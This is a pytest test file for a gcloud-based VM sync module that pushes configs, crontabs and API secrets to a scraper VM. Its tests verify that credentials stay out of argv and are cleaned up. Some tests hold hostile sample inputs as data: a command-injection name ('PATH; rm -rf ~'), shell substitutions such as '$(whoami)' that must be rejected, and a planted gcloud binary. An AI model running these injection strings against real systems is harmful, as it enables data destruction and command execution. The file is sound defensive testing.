"""gcloud-based VM sync core (local/vm_sync.py).

Pure argv builders. No real gcloud ever runs (the runner is
mocked); no secret is read — only non-secret connection identifiers.
"""
import os
import sys
import types
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "local"))

import vm_sync  # noqa: E402


def _target():
    return vm_sync.VMTarget(gcloud="gcloud", instance="scraper-vm", zone="us-east1-c",
                            project="proj-123", user="yib", remote_dir="~")


def test_from_mapping_and_defaults():
    t = vm_sync.VMTarget.from_mapping({"VM_INSTANCE": "scraper-vm", "VM_ZONE": "us-east1-c",
                                       "VM_USER": "yib"})
    assert t.instance == "scraper-vm" and t.zone == "us-east1-c" and t.user == "yib"
    assert t.gcloud == "gcloud" and t.remote_dir == "~"  # defaults


def test_configured_requires_instance_zone_user():
    assert _target().configured() is True
    assert vm_sync.VMTarget(instance="", zone="", user="").configured() is False


def test_build_ssh_cmd():
    cmd = _target().build_ssh_cmd("echo hi")
    assert cmd[:3] == ["gcloud", "compute", "ssh"]
    assert "yib@scraper-vm" in cmd
    assert "--zone=us-east1-c" in cmd
    assert "--project=proj-123" in cmd
    assert "--command=echo hi" in cmd


def test_build_scp_cmd_dest_path():
    # remote_dir "~" must NOT be sent literally: Windows pscp can't open a
    # "~/..." path, so a home-dir push uses a bare relative dest.
    cmd = _target().build_scp_cmd("/local/search_config.json", "search_config.json")
    assert cmd[:3] == ["gcloud", "compute", "scp"]
    assert "/local/search_config.json" in cmd
    assert "yib@scraper-vm:search_config.json" in cmd
    assert "yib@scraper-vm:~/search_config.json" not in cmd


def test_build_scp_cmd_custom_dir_keeps_prefix():
    t = vm_sync.VMTarget(instance="scraper-vm", zone="z", user="yib", remote_dir="/opt/scraper/")
    cmd = t.build_scp_cmd("/local/x.json", "x.json")
    assert "yib@scraper-vm:/opt/scraper/x.json" in cmd


def test_set_pause_and_resume_and_crontab_are_ssh():
    t = _target()
    assert "pause_until" in t.set_pause_cmd("2026-07-01 09:00")[-1]
    assert "rm -f ~/pause_until" in t.resume_cmd()[-1]
    assert "crontab -" in t.install_crontab_cmd("0 10 * * * ~/run_scraper.sh")[-1]


def test_merge_crontab_preserves_env_lines_and_replaces_block():
    # A push must keep every line OUTSIDE the managed markers (the healthcheck
    # and project env lines the docs tell users to add) and swap only the block.
    import vm_schedule
    existing = (
        "HEALTHCHECKS_URL=https://hc-ping.com/abc\n"
        "GOOGLE_CLOUD_PROJECT=example-gcp-project\n"
        f"{vm_schedule.SCHEDULE_BEGIN}\n"
        "0 8 * * * ~/run_scraper.sh\n"
        f"{vm_schedule.SCHEDULE_END}\n"
    )
    combined = vm_sync.merge_crontab(existing, vm_schedule.build_crontab(["19:00"]))
    assert "HEALTHCHECKS_URL=https://hc-ping.com/abc" in combined
    assert "GOOGLE_CLOUD_PROJECT=example-gcp-project" in combined
    assert "0 8 * * *" not in combined            # old schedule gone
    assert "0 19 * * *" in combined               # new schedule in
    assert combined.count(vm_schedule.SCHEDULE_BEGIN) == 1  # no duplicate blocks
    assert combined.count(vm_schedule.SCHEDULE_END) == 1


def test_merge_crontab_appends_when_no_prior_block():
    import vm_schedule
    existing = "HEALTHCHECKS_URL=https://hc-ping.com/abc\n"
    combined = vm_sync.merge_crontab(existing, vm_schedule.build_crontab(["10:00"]))
    assert "HEALTHCHECKS_URL=https://hc-ping.com/abc" in combined
    assert combined.count(vm_schedule.SCHEDULE_BEGIN) == 1
    assert "0 10 * * *" in combined


def test_install_crontab_cmd_merges_not_replaces():
    # The remote command fetches the existing crontab and strips only the managed
    # block instead of blindly overwriting the whole crontab.
    remote = _target().install_crontab_cmd("0 10 * * * ~/run_scraper.sh")[-1]
    assert "crontab -l" in remote                       # fetch current
    assert "INPLOYED-SCHEDULE-BEGIN" in remote          # target the managed block
    assert "INPLOYED-SCHEDULE-END" in remote
    assert "crontab -" in remote                        # still installs


def test_push_exclude_ids_cmd_targets_remote_file():
    # The seen-id file lands at the VM home (relative dest for "~", same as configs).
    cmd = _target().push_exclude_ids_cmd("/local/external_exclude_ids.json")
    assert cmd[:3] == ["gcloud", "compute", "scp"]
    assert "/local/external_exclude_ids.json" in cmd
    assert "yib@scraper-vm:external_exclude_ids.json" in cmd
    assert "yib@scraper-vm:~/external_exclude_ids.json" not in cmd


def test_sync_exclude_ids_returns_none_when_unconfigured(monkeypatch):
    monkeypatch.setattr(vm_sync, "run_cmd", lambda cmd: (_ for _ in ()).throw(
        AssertionError("run_cmd must not be called when the VM is unconfigured")))
    unconfigured = vm_sync.VMTarget(instance="", zone="", user="")
    assert vm_sync.sync_exclude_ids_to_vm(unconfigured, "/local/x.json") is None


def test_sync_exclude_ids_runs_scp_when_configured(monkeypatch):
    seen = {}

    def _run(cmd):
        seen["cmd"] = cmd
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(vm_sync, "run_cmd", _run)
    res = vm_sync.sync_exclude_ids_to_vm(_target(), "/local/external_exclude_ids.json")
    assert res.returncode == 0
    assert seen["cmd"] == _target().push_exclude_ids_cmd("/local/external_exclude_ids.json")


# Captured at import time — conftest's hermetic autouse fixture replaces
# vm_sync.run_cmd with a blocked stub for every test, so the one test OF
# run_cmd itself must hold the real function (module import runs first).
_REAL_RUN_CMD = vm_sync.run_cmd


def test_run_cmd_invokes_subprocess(monkeypatch):
    seen = {}

    def _run(cmd, **k):
        seen["cmd"] = cmd
        return types.SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(vm_sync.subprocess, "run", _run)
    res = _REAL_RUN_CMD(["gcloud", "compute", "ssh"])
    # run_cmd launches via launch_argv (which on Windows bypasses the gcloud.cmd
    # batch wrapper); on a box without gcloud it's the same argv.
    assert seen["cmd"] == vm_sync.launch_argv(["gcloud", "compute", "ssh"])
    assert res.returncode == 0


def test_run_cmd_decodes_gcloud_output_as_utf8(monkeypatch):
    """3.4: text=True without an explicit encoding decodes with the OS default,
    so a gcloud error body carrying non-ASCII would raise UnicodeDecodeError and
    surface as a failed sync with no message."""
    seen = {}

    def _run(cmd, **k):
        seen.update(k)
        return types.SimpleNamespace(returncode=0, stdout="ok", stderr="")

    monkeypatch.setattr(vm_sync.subprocess, "run", _run)
    _REAL_RUN_CMD(["gcloud", "version"])
    assert seen.get("text") is True
    assert seen.get("encoding") == "utf-8"
    assert seen.get("errors") == "replace"


def _fake_sdk(tmp_path, with_gpy=True, with_bundled=True):
    sdk = tmp_path / "google-cloud-sdk"
    (sdk / "bin").mkdir(parents=True)
    (sdk / "lib").mkdir(parents=True)
    cmd = sdk / "bin" / "gcloud.cmd"
    cmd.write_text("@echo off\n", encoding="utf-8")
    gpy = sdk / "lib" / "gcloud.py"
    if with_gpy:
        gpy.write_text("# gcloud entrypoint\n", encoding="utf-8")
    bundled = sdk / "platform" / "bundledpython" / "python.exe"
    if with_bundled:
        bundled.parent.mkdir(parents=True)
        bundled.write_text("", encoding="utf-8")
    return cmd, gpy, bundled


def test_bypass_argv_runs_gcloud_py_with_bundled_python(tmp_path, monkeypatch):
    monkeypatch.delenv("CLOUDSDK_PYTHON", raising=False)
    cmd, gpy, bundled = _fake_sdk(tmp_path)
    argv = vm_sync._bypass_argv(str(cmd), ["compute", "ssh", "--command=a && b"])
    assert argv == [str(bundled), "-S", str(gpy), "compute", "ssh", "--command=a && b"]


def test_bypass_argv_honours_cloudsdk_python_env(tmp_path, monkeypatch):
    cmd, gpy, _ = _fake_sdk(tmp_path, with_bundled=False)
    monkeypatch.setenv("CLOUDSDK_PYTHON", "C:/py/python.exe")
    argv = vm_sync._bypass_argv(str(cmd), ["version"])
    assert argv[0] == "C:/py/python.exe"
    assert argv[1:] == ["-S", str(gpy), "version"]


def test_bypass_argv_none_when_no_entrypoint(tmp_path):
    cmd, _, _ = _fake_sdk(tmp_path, with_gpy=False)
    assert vm_sync._bypass_argv(str(cmd), ["version"]) is None


def test_push_outbox_file_cmd_targets_incoming():
    cmd = _target().push_outbox_file_cmd("/local/outbox/local_rows_x.csv.gz")
    assert cmd[:3] == ["gcloud", "compute", "scp"]
    assert "/local/outbox/local_rows_x.csv.gz" in cmd
    assert "yib@scraper-vm:incoming/local_rows_x.csv.gz" in cmd
    assert "yib@scraper-vm:~/incoming/local_rows_x.csv.gz" not in cmd


# --- managed VM secrets (set the Bright Data / Gemini credentials from the GUI) ---
#
# The whole point of these is that the SECRET VALUE NEVER TOUCHES THE ARGV: it
# rides an scp'd mode-600 file that the remote script deletes, so it can't leak
# into the local process list, a crash traceback, or gcloud's own logging (which
# copies every --command verbatim). Not stdin: plink eats it on Windows. See
# vm_sync.stage_secret_cmd for both measurements.

def test_managed_secret_names_are_the_two_the_vm_actually_reads():
    assert set(vm_sync.MANAGED_SECRETS) == {"BRIGHT_DATA_API_TOKEN", "GEMINI_API_KEYS"}


def test_set_secret_cmd_is_ssh_and_names_the_variable():
    cmd = _target().set_secret_cmd("BRIGHT_DATA_API_TOKEN")
    assert cmd[:3] == ["gcloud", "compute", "ssh"]
    assert "BRIGHT_DATA_API_TOKEN" in cmd[-1]
    assert "scraper_secrets.env" in cmd[-1]


def test_set_secret_cmd_NEVER_carries_the_value():
    """The regression that matters. Two channels were ruled out by measurement:
    gcloud copies the whole --command into its plaintext debug log, and plink
    eats stdin. So the value must arrive as a staged file and nothing else."""
    cmd = _target().set_secret_cmd("BRIGHT_DATA_API_TOKEN")
    assert vm_sync.SECRET_STAGE_REMOTE_FILE in cmd[-1]   # read from the staged file
    assert "read -r V" not in cmd[-1]                    # never from stdin


def test_no_argv_anywhere_carries_the_value(monkeypatch):
    """The same claim, asserted where a value actually exists.

    The test above can only check the shape of an argv built from a name, since
    set_secret_cmd takes no value at all -- it used to end with a loop asserting a
    sentinel was absent from that argv, which was true by construction and could
    never fail. Drive the whole set_vm_secret path with a real sentinel instead
    and check EVERY argv of BOTH gcloud calls."""
    sentinel = "tok-SENTINEL-abc123"
    checked = []

    def fake_run(cmd):
        for part in cmd:
            assert sentinel not in part, f"value leaked into argv: {part!r}"
        checked.append(cmd[2])
        return types.SimpleNamespace(returncode=0, stdout="SECRET_SET", stderr="")

    monkeypatch.setattr(vm_sync, "run_cmd", fake_run)
    vm_sync.set_vm_secret(_target(), "BRIGHT_DATA_API_TOKEN", sentinel)
    assert checked == ["scp", "ssh"]        # both calls were actually inspected


def test_the_staged_secret_file_is_always_deleted_on_the_vm():
    remote = _target().set_secret_cmd("BRIGHT_DATA_API_TOKEN")[-1]
    assert "trap 'rm -f" in remote      # an EXIT trap, so a failure cleans up too


def test_stage_secret_cmd_is_an_scp_of_the_local_file():
    cmd = _target().stage_secret_cmd("/tmp/x/value.txt")
    assert cmd[:3] == ["gcloud", "compute", "scp"]
    assert "/tmp/x/value.txt" in cmd
    assert any(vm_sync.SECRET_STAGE_REMOTE_FILE in p for p in cmd)


def test_set_secret_cmd_rejects_an_unmanaged_variable_name():
    """No arbitrary env-var injection through the name."""
    import pytest
    with pytest.raises(ValueError):
        _target().set_secret_cmd("PATH; rm -rf ~")


def test_set_secret_cmd_chmods_the_file_and_syntax_checks_the_script():
    remote = _target().set_secret_cmd("GEMINI_API_KEYS")[-1]
    assert "chmod 600" in remote
    assert "bash -n" in remote            # never leave run_scraper.sh unparseable
    # ONE fixed-name backup, not a timestamped one per click: every copy carries
    # whatever credential was inline at the time, so a dated name quietly builds a
    # pile of readable old tokens in the VM's home dir.
    assert "run_scraper.sh.inployed.bak" in remote.replace('$S.', 'run_scraper.sh.')
    assert ".bak-$(date" not in remote


def test_set_secret_cmd_neutralises_the_old_inline_export():
    """Otherwise the inline `export TOKEN=<dead>` later in run_scraper.sh would
    override the value we just sourced, and the fix would silently do nothing."""
    remote = _target().set_secret_cmd("BRIGHT_DATA_API_TOKEN")[-1]
    assert "^export BRIGHT_DATA_API_TOKEN=" in remote


def test_valid_secret_values_are_accepted():
    # Shapes only, all three synthetic. Never paste a live credential here.
    for good in ("00000000-0000-4000-8000-000000000000", "AQ.abc_123", "k1,k2,k3"):
        assert vm_sync.valid_secret_value(good) is True


def test_shell_unsafe_secret_values_are_rejected():
    """The file is sourced by bash, so a `$` or backtick in the value would be
    interpolated at source time. Reject rather than try to escape."""
    # "a\\b" is a literal BACKSLASH. This list used to say "a\b", which Python
    # reads as an ASCII backspace -- also rejected, but not the character the
    # comment is about, so the backslash case was untested.
    for bad in ("", "   ", "a b", "$(whoami)", "`id`", 'a"b', "a'b", "a\\b", "a$b",
                "a\nb", "a;b", "a|b", "a>b", "a\tb"):
        assert vm_sync.valid_secret_value(bad) is False


def test_set_vm_secret_stages_the_value_then_installs_it(monkeypatch):
    seen = []

    def fake_run(cmd):
        # capture the staged file's CONTENT at scp time; it is gone by the end
        if "scp" in cmd:
            src = [p for p in cmd if p.endswith("value.txt")][0]
            seen.append(("scp", src, open(src, encoding="utf-8").read()))
        else:
            seen.append(("ssh", None, None))
        return types.SimpleNamespace(returncode=0, stdout="SECRET_SET", stderr="")

    monkeypatch.setattr(vm_sync, "run_cmd", fake_run)
    vm_sync.set_vm_secret(_target(), "BRIGHT_DATA_API_TOKEN", "tok-123")

    assert [s[0] for s in seen] == ["scp", "ssh"]      # stage, then install
    assert seen[0][2] == "tok-123\n"                  # value rode the file
    assert not os.path.exists(seen[0][1])              # and the temp dir is gone


def test_set_vm_secret_deletes_the_local_temp_even_when_the_push_fails(monkeypatch):
    seen = {}

    def boom(cmd):
        seen["src"] = [p for p in cmd if p.endswith("value.txt")][0]
        raise RuntimeError("scp exploded")

    monkeypatch.setattr(vm_sync, "run_cmd", boom)
    try:
        vm_sync.set_vm_secret(_target(), "BRIGHT_DATA_API_TOKEN", "tok-123")
    except RuntimeError:
        pass
    assert not os.path.exists(seen["src"])   # no plaintext credential left behind


def test_set_vm_secret_skips_the_install_when_staging_fails(monkeypatch):
    """A failed scp must not run the installer -- but it MUST still try to clear
    the staged file. A transfer that dies after the bytes arrive reports failure
    too, and the installer is the only thing that ever arms the EXIT trap.
    """
    calls = []

    def fake_run(cmd):
        calls.append(cmd)
        return types.SimpleNamespace(returncode=1, stdout="", stderr="permission denied")

    monkeypatch.setattr(vm_sync, "run_cmd", fake_run)
    res = vm_sync.set_vm_secret(_target(), "BRIGHT_DATA_API_TOKEN", "tok-123")
    assert res.returncode == 1
    kinds = ["scp" if "scp" in c else "ssh" for c in calls]
    assert kinds == ["scp", "ssh"]
    # the one ssh is the cleanup, never the installer
    assert any(p.startswith("--command=rm -f") and vm_sync.SECRET_STAGE_REMOTE_FILE in p
               for p in calls[1])
    assert not any("SECRET_SET" in p for p in calls[1]), "the installer ran anyway"


def test_set_vm_secret_refuses_an_unconfigured_target():
    assert vm_sync.set_vm_secret(vm_sync.VMTarget(), "BRIGHT_DATA_API_TOKEN", "x") is None


# --- the remote script, executed for real against a throwaway $HOME -----------
#
# The argv builders above are pure, so nothing else in this file proves the
# SCRIPT is correct -- and its failure mode is nasty: a mangled run_scraper.sh on
# the box that runs the cron, or a success message over a credential that never
# took effect.

def _bash_or_skip():
    import shutil
    bash = shutil.which("bash")
    if not bash:
        import pytest
        pytest.skip("no bash available to run the remote script")
    return bash


def _fake_home(tmp_path, run_scraper: str | None):
    """A throwaway $HOME, optionally holding a stand-in run_scraper.sh."""
    home = tmp_path / "home"
    home.mkdir(exist_ok=True)
    if run_scraper is not None:
        (home / "run_scraper.sh").write_text(run_scraper, newline="\n", encoding="utf-8")
    return home


def _install(tmp_path, home, value, name="BRIGHT_DATA_API_TOKEN"):
    """Stage `value` the way scp would, then run the generated install script."""
    import subprocess
    bash = _bash_or_skip()
    remote = _target().set_secret_cmd(name)[-1][len("--command="):]
    script = tmp_path / f"remote_{name}.sh"
    script.write_text(remote, newline="\n", encoding="utf-8")
    staged = home / vm_sync.SECRET_STAGE_REMOTE_FILE
    staged.write_text(value + "\n", newline="\n", encoding="utf-8")
    res = subprocess.run([bash, str(script)], env={**os.environ, "HOME": str(home)},
                         capture_output=True, text=True,
                         encoding="utf-8", errors="replace", timeout=60)
    return res, staged


def test_the_remote_secret_script_actually_works_end_to_end(tmp_path):
    import subprocess
    bash = _bash_or_skip()
    home = _fake_home(tmp_path,
                      "#!/bin/bash\n"
                      "export BRIGHT_DATA_API_TOKEN=deadtoken-old\n"
                      "export BRIGHT_DATA_DATASET_ID=gd_keepme\n"
                      "set -e\n")

    # Twice, to prove it is idempotent: a rotation must replace, never append.
    for value in ("first-value-111", "second-value-222"):
        res, staged = _install(tmp_path, home, value)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "SECRET_SET" in res.stdout
        assert not staged.exists(), "the staged credential must not survive the run"

    secrets = (home / "scraper_secrets.env").read_text(encoding="utf-8")
    assert secrets.count("export BRIGHT_DATA_API_TOKEN=") == 1   # replaced, not appended
    assert "second-value-222" in secrets and "first-value-111" not in secrets

    script_text = (home / "run_scraper.sh").read_text(encoding="utf-8")
    # the dead inline export must be neutralised, or it would override the source
    assert "\nexport BRIGHT_DATA_API_TOKEN=" not in script_text
    assert script_text.count("INPLOYED SECRETS BEGIN") == 1      # inserted once only
    assert "export BRIGHT_DATA_DATASET_ID=gd_keepme" in script_text   # untouched
    # one fixed-name backup, not one per click (each carries the old credential)
    assert [p.name for p in home.glob("run_scraper.sh.*")] == ["run_scraper.sh.inployed.bak"]

    # and the whole thing still parses, then yields the NEW value when sourced
    assert subprocess.run([bash, "-n", str(home / "run_scraper.sh")]).returncode == 0
    out = subprocess.run(
        [bash, "-c", 'source "$HOME/run_scraper.sh" >/dev/null; '
                     'echo "$BRIGHT_DATA_API_TOKEN|$BRIGHT_DATA_DATASET_ID"'],
        env={**os.environ, "HOME": str(home)},
        capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=60).stdout.strip()
    assert out == "second-value-222|gd_keepme"


def test_an_indented_inline_export_is_neutralised_not_left_to_win(tmp_path):
    """A sed anchored at column 0 leaves `  export NAME=old` alive.

    That is the worst outcome this feature has: the script exits 0, the panel says
    "set on the VM", and the cron run keeps using the dead credential, because the
    inline assignment sits after the source line and wins."""
    import subprocess
    bash = _bash_or_skip()
    home = _fake_home(tmp_path,
                      "#!/bin/bash\n"
                      "  export BRIGHT_DATA_API_TOKEN=indented-old\n"
                      "\texport  GEMINI_API_KEYS=tabbed-old\n"
                      "set -e\n")
    res, _ = _install(tmp_path, home, "new-value-333")
    assert res.returncode == 0, res.stdout + res.stderr

    out = subprocess.run(
        [bash, "-c", 'source "$HOME/run_scraper.sh" >/dev/null; '
                     'printf %s "$BRIGHT_DATA_API_TOKEN"'],
        env={**os.environ, "HOME": str(home)},
        capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=60).stdout.strip()
    assert out == "new-value-333", "the indented dead export still won"


def test_a_missing_run_scraper_reports_a_problem_instead_of_success(tmp_path):
    """No run_scraper.sh means nothing sources the secrets file, so the credential
    is written and completely inert. That used to print SECRET_SET and exit 0."""
    home = _fake_home(tmp_path, None)
    res, staged = _install(tmp_path, home, "value-444")
    assert res.returncode != 0
    assert "NO_RUN_SCRIPT" in res.stdout
    assert "SECRET_SET" not in res.stdout
    assert not staged.exists()


def test_an_empty_run_scraper_is_treated_as_missing(tmp_path):
    """`sed '1a ...'` has no line 1 to append after, so the source line would
    never land."""
    home = _fake_home(tmp_path, "")
    res, _ = _install(tmp_path, home, "value-555")
    assert res.returncode != 0
    assert "NO_RUN_SCRIPT" in res.stdout


def test_two_managed_secrets_coexist_and_rotate_independently(tmp_path):
    """The secrets file holds both; installing one must not drop the other."""
    home = _fake_home(tmp_path, "#!/bin/bash\nset -e\n")
    for name, value in (("BRIGHT_DATA_API_TOKEN", "bd-111"),
                        ("GEMINI_API_KEYS", "g1,g2,g3"),
                        ("BRIGHT_DATA_API_TOKEN", "bd-222")):
        res, _ = _install(tmp_path, home, value, name=name)
        assert res.returncode == 0, res.stdout + res.stderr

    secrets = (home / "scraper_secrets.env").read_text(encoding="utf-8")
    assert 'export BRIGHT_DATA_API_TOKEN="bd-222"' in secrets
    assert 'export GEMINI_API_KEYS="g1,g2,g3"' in secrets
    assert secrets.count("export BRIGHT_DATA_API_TOKEN=") == 1
    assert "bd-111" not in secrets
    # and the source block was still only inserted once across three installs
    assert (home / "run_scraper.sh").read_text(
        encoding="utf-8").count("INPLOYED SECRETS BEGIN") == 1


def test_a_failed_install_still_removes_the_staged_credential(tmp_path):
    """The EXIT trap, proven: an unparseable run_scraper.sh aborts the script, and
    the plaintext credential must not be left sitting in the VM's home dir.

    It also must not blame itself for breakage it did not cause -- this script was
    already invalid before the edit, so the code says so."""
    home = _fake_home(tmp_path, "#!/bin/bash\nif then fi\n")
    res, staged = _install(tmp_path, home, "tok-abc")
    assert res.returncode != 0
    assert "SCRIPT_ALREADY_BROKEN" in res.stdout
    assert not staged.exists()
    # and the original script is back exactly as it was
    assert (home / "run_scraper.sh").read_text(encoding="utf-8") == "#!/bin/bash\nif then fi\n"


def test_a_non_home_remote_dir_is_refused_before_anything_is_uploaded(tmp_path):
    """build_scp_cmd honours remote_dir; the install script hardcodes $HOME. Left
    unchecked, the staged credential lands somewhere the EXIT trap never reaches
    and every attempt orphans a plaintext token on the VM."""
    import pytest
    t = vm_sync.VMTarget(instance="scraper-vm", zone="z", user="u",
                         remote_dir="/opt/scraper")
    with pytest.raises(ValueError, match="VM_REMOTE_DIR"):
        t.stage_secret_cmd("/tmp/x/value.txt")
    with pytest.raises(ValueError, match="VM_REMOTE_DIR"):
        t.set_secret_cmd("BRIGHT_DATA_API_TOKEN")


def test_an_unmanaged_name_is_refused_before_the_value_is_uploaded(monkeypatch):
    """set_secret_cmd runs only AFTER the scp, so a name check there would let a
    rejected name put the plaintext credential on the VM anyway, with no EXIT trap
    ever armed to remove it. The check belongs before the upload."""
    import pytest
    calls = []
    monkeypatch.setattr(vm_sync, "run_cmd", lambda cmd: calls.append(cmd) or
                        types.SimpleNamespace(returncode=0, stdout="", stderr=""))
    with pytest.raises(ValueError, match="not a managed VM secret"):
        vm_sync.set_vm_secret(_target(), "PATH", "anything")
    assert calls == [], "nothing may be uploaded before the name is validated"


def test_a_crash_on_the_install_step_clears_the_staged_credential(monkeypatch):
    """The EXIT trap only fires if the installer RUNS. When the ssh half never
    starts (expired session, network drop, run_cmd's 300s timeout), Python has to
    clean up the VM side itself."""
    import pytest
    calls = []

    def fake_run(cmd):
        calls.append(cmd)
        if "scp" in cmd:
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        # The INSTALL command also contains `rm -f` (its EXIT trap), so match the
        # cleanup on the whole --command being nothing but the rm.
        if any(p.startswith("--command=rm -f") for p in cmd):
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        raise TimeoutError("gcloud ssh timed out")

    monkeypatch.setattr(vm_sync, "run_cmd", fake_run)
    with pytest.raises(TimeoutError):
        vm_sync.set_vm_secret(_target(), "BRIGHT_DATA_API_TOKEN", "tok-abc")
    assert any(any(p.startswith("--command=rm -f") and vm_sync.SECRET_STAGE_REMOTE_FILE in p
                   for p in c) for c in calls), \
        "no cleanup was attempted for the staged credential"


def test_the_retired_inline_credential_is_removed_not_just_commented(tmp_path):
    """The whole point of this feature is to get credentials OUT of run_scraper.sh,
    which is mode 755 on the VM. The sed used to keep `\2NAME=` in the replacement,
    so the neutralised line still carried the retired token in that exact file,
    forever. The value is not lost -- the mode-600 backup holds the original."""
    home = _fake_home(tmp_path,
                      "#!/bin/bash\n"
                      "export BRIGHT_DATA_API_TOKEN=deadtoken-old\n"
                      "  export GEMINI_API_KEYS=indented-dead-keys\n"
                      "export BRIGHT_DATA_DATASET_ID=gd_keepme\n"
                      "set -e\n")
    res, _ = _install(tmp_path, home, "new-value-666")
    assert res.returncode == 0, res.stdout + res.stderr

    script_text = (home / "run_scraper.sh").read_text(encoding="utf-8")
    assert "deadtoken-old" not in script_text, "the retired token is still in the script"
    assert "BRIGHT_DATA_API_TOKEN moved into scraper_secrets.env" in script_text
    # only the variable being installed is touched
    assert "indented-dead-keys" in script_text
    assert "export BRIGHT_DATA_DATASET_ID=gd_keepme" in script_text
    # the original is preserved once, in the mode-600 backup
    backup = (home / "run_scraper.sh.inployed.bak").read_text(encoding="utf-8")
    assert "deadtoken-old" in backup


def test_a_second_install_rolls_back_to_THIS_run_not_the_first_ever(tmp_path):
    """The revert paths used to restore $B, the create-once backup. From install
    two onward that is a snapshot from before install ONE, so any failed check
    rewound run_scraper.sh past every successful install and every edit the user
    had made since -- deleting the source block, reinstating a credential the
    user had already rotated away, and taking their own edits with it.

    Reproduced by installing once (which succeeds), editing the script the way a
    user would, then forcing the second install's post-check to fail.
    """
    home = _fake_home(tmp_path,
                      "#!/bin/bash\n"
                      "export BRIGHT_DATA_API_TOKEN=deadtoken-old\n"
                      "set -e\n")
    res, _ = _install(tmp_path, home, "first-value-111")
    assert res.returncode == 0, res.stdout + res.stderr

    script = home / "run_scraper.sh"
    after_first = script.read_text(encoding="utf-8")
    assert "INPLOYED SECRETS BEGIN" in after_first
    assert "deadtoken-old" not in after_first
    # the user then edits their own cron entry point
    script.write_text(after_first + "echo 'my own line'\n", newline="\n", encoding="utf-8")

    # now make the second install hit a revert path. Any of them does the same
    # cp; an unparseable script is the one that can be triggered deterministically.
    script.write_text(script.read_text(encoding="utf-8") + "if then fi\n",
                      newline="\n", encoding="utf-8")
    before_second = script.read_text(encoding="utf-8")
    res2, _ = _install(tmp_path, home, "second-value-222")
    assert res2.returncode != 0
    assert "SCRIPT_ALREADY_BROKEN" in res2.stdout

    reverted = script.read_text(encoding="utf-8")
    assert reverted == before_second, "the revert did not restore THIS run's state"
    assert "my own line" in reverted, "the user's own edit was destroyed"
    assert "INPLOYED SECRETS BEGIN" in reverted, "the source block was rewound away"
    assert "deadtoken-old" not in reverted, "a retired credential was reinstated"


def test_no_rollback_temp_file_survives_the_run(tmp_path):
    """The per-run rollback copy is a temp file next to run_scraper.sh, so the
    EXIT trap has to remove it on success AND on every failure path -- otherwise
    the feature leaves a mode-600 copy of the cron script per click, which is the
    pile P1-5 removed in the first place."""
    home = _fake_home(tmp_path, "#!/bin/bash\nexport KEEP=me\nset -e\n")
    ok, _ = _install(tmp_path, home, "value-777")
    assert ok.returncode == 0, ok.stdout + ok.stderr
    assert sorted(p.name for p in home.glob("run_scraper.sh.*")) == \
        ["run_scraper.sh.inployed.bak"]

    # and on a failing run too
    (home / "run_scraper.sh").write_text("#!/bin/bash\nif then fi\n",
                                         newline="\n", encoding="utf-8")
    bad, _ = _install(tmp_path, home, "value-888")
    assert bad.returncode != 0
    assert sorted(p.name for p in home.glob("run_scraper.sh.*")) == \
        ["run_scraper.sh.inployed.bak"]


def test_the_staged_credential_is_chmodded_before_it_is_read(tmp_path):
    """scp does not preserve the source mode without -p, and the 0600 os.open
    passes on Windows is a no-op anyway (CPython honours only the read-only bit
    there), so the file lands at the REMOTE umask -- 0644 on a stock VM. The
    installer narrows it before reading the value out."""
    remote = _target().set_secret_cmd("BRIGHT_DATA_API_TOKEN")[-1]
    body = remote[len("--command="):]
    assert 'chmod 600 "$IN"' in body
    assert body.index('chmod 600 "$IN"') < body.index('V="$(head -n 1 "$IN")"')


def test_an_install_that_never_started_clears_the_staged_credential(monkeypatch):
    """A non-zero exit carrying NONE of the installer's own markers means the
    remote script never ran -- gcloud or plink failed between the two calls -- so
    its EXIT trap never armed and this side has to clear the VM itself. A failure
    that DID print a marker ran the trap and must not cost a second ssh."""
    def run_with(stdout, rc=1):
        calls = []

        def fake_run(cmd):
            calls.append(cmd)
            if "scp" in cmd:
                return types.SimpleNamespace(returncode=0, stdout="", stderr="")
            if any(p.startswith("--command=rm -f") for p in cmd):
                return types.SimpleNamespace(returncode=0, stdout="", stderr="")
            return types.SimpleNamespace(returncode=rc, stdout=stdout, stderr="")

        monkeypatch.setattr(vm_sync, "run_cmd", fake_run)
        vm_sync.set_vm_secret(_target(), "BRIGHT_DATA_API_TOKEN", "tok-123")
        return [c for c in calls
                if any(p.startswith("--command=rm -f") for p in c)]

    # transport died, no marker -> clean up
    assert run_with("ERROR: (gcloud.compute.ssh) Could not fetch resource"), \
        "a transport failure left the staged credential on the VM"
    # the script ran and failed on its own terms -> its trap already fired
    assert run_with("NO_RUN_SCRIPT") == []
    assert run_with("SECRET_SET: BRIGHT_DATA_API_TOKEN", rc=0) == []


def test_a_bare_gcloud_is_never_taken_from_the_working_directory(tmp_path, monkeypatch):
    """shutil.which puts os.curdir FIRST on Windows, so a gcloud.exe dropped in
    the dashboard's working directory beats the real SDK -- and that process would
    receive the generated --command script and the scp of the staged credential's
    path. A bare program name comes from PATH or not at all."""
    import pytest
    monkeypatch.setattr(vm_sync.os, "name", "nt")
    planted = tmp_path / "gcloud.exe"
    planted.write_text("", encoding="utf-8")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(vm_sync.shutil, "which", lambda name: str(planted))
    with pytest.raises(RuntimeError, match="working directory"):
        vm_sync.launch_argv(["gcloud", "compute", "ssh"])

    # an explicit path is the user's own choice and is left alone
    monkeypatch.setattr(vm_sync.shutil, "which", lambda name: str(planted))
    assert vm_sync.launch_argv([str(planted), "compute", "ssh"])[0] == str(planted)


def test_leftover_staging_dirs_reports_what_the_finally_could_not_delete(tmp_path,
                                                                        monkeypatch):
    """set_vm_secret's warning is a print(), and the dashboard runs under pythonw
    with no console, so the panel asks this instead."""
    monkeypatch.setattr(vm_sync.tempfile, "gettempdir", lambda: str(tmp_path))
    assert vm_sync.leftover_staging_dirs() == []
    (tmp_path / "inployed-secret-abc").mkdir()
    (tmp_path / "unrelated-dir").mkdir()
    found = vm_sync.leftover_staging_dirs()
    assert [d.name for d in found] == ["inployed-secret-abc"]


# --- VM_REMOTE_DIR reaches the VM's shell, so it is validated ------------------

